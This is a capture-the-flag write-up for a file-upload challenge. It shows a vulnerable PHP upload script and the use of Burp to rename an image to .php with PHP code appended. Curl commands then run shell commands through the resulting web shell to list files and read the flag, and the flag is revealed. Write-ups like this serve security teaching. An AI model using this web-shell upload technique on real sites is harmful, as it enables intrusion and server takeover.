---
layout: default
---

![Imagicur (150 pts)](./screenshots/Imagicur.png)
---
## CHALLENGE INFO
- __CHALLENGE LINK__: https://imagicur.tghack.no/
- __LANDING PAGE__:

  ![homepage](./screenshots/Imagicur_home.png)

  - Page Source:
    ```html
    <html>
    <body>

    <form action="upload.php" method="post" enctype="multipart/form-data">
        Select image to upload:
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" value="Upload Image" name="submit">
    </form>
 
    </body>
    </html>
    ```
- __ASSUMED OBJECTIVE__: Exploit a vulnerability in __*upload.php*__

---

## Step 1 : Examine the given source code for __*upload.php*__

- __*upload.php*__
  ```PHP
  <?php
  $target_dir = "uploads/";
  $uplFilename = basename($_FILES["fileToUpload"]["name"]);
  $imageFileType = strtolower(pathinfo($uplFilename,PATHINFO_EXTENSION));
  $filename = uniqid() . ".$imageFileType";
  $target_file = $target_dir . $filename;
  $uploadOk = 1;
  // Check if image file is a actual image or fake image
  if(isset($_POST["submit"])) {
      $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
      if($check !== false) {
          echo "File is an image - " . $check["mime"] . ".";
          $uploadOk = 1;
      } else {
          echo "File is not an image.";
          $uploadOk = 0;
      }
  }

  if($uploadOk == 0) {
	  echo "Failed upload :( Is it a valid image file?";
  } else {
	  move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
	  echo "File available at <a href='$target_file'>$target_file</a>";
  }

  ?>
  ```
  __Notes:__
  - __PATHINFO_EXTENSION__ takes the last given file extension
    - __double extensions__ and __null byte injection__ won't work
  - The __file extension__ of the uploaded file is __appended__ and saved to a __new filename__
  - The uploaded file __needs__ to be an image
  - Successfully uploaded files are save in the __uploads/__ directory

---

## Step 2 : Create a working payload

1. Upload an image and intercept the request using __Burp__

   ![upload](./screenshots/Imagicur_upload.png)

2. Pass the request to __Burp *repeater*__

   ![upload](./screenshots/Imagicur_upload_1.png)

   __Note__:
   - The image was succesfully uploaded.

3. Edit the *request* to contain RCE (Remote Code Execution)
   1. Change the extension of the image to __php__:
      ```
      -----------------------------payload
      Content-Disposition: form-data; name="fileToUpload"; filename="imagicur_payload.php"
      Content-Type: image/png
      ```
   2. Append __PHP code__ at the end of the image data
      
      ![RCE code](./screenshots/Imagicur_upload_2.png)

      __Note__:
      - The file was uploaded with a __*.php*__ extension.

---

## Step 3 : Extract the flag

   ```sh
   curl -d "cmd=ls -lah ../" -G -o- https://imagicur.tghack.no/uploads/5cb9cb05189eb.php
   # ...
   # drwxr-xr-x 1 root     root     4.0K Apr 17 12:53 .
   # drwxr-xr-x 1 root     root     4.0K Apr 17 12:53 ..
   # -rw-r--r-- 1 root     root       35 Apr 16 07:09 flag.txt
   # -rw-r--r-- 1 root     root      262 Apr 16 07:09 index.php
   # -rw-r--r-- 1 root     root      827 Apr 16 07:09 upload.php
   # drwxr-xr-x 1 www-data www-data  20K Apr 19 13:31 uploads

   curl -d "cmd=cat ../flag.txt" -G -o- https://imagicur.tghack.no/uploads/5cb9cb05189eb.php
   # TG19{phony_php_images_can_b_scary}
   ```

---

## FLAG : __TG19{phony_php_images_can_b_scary}__
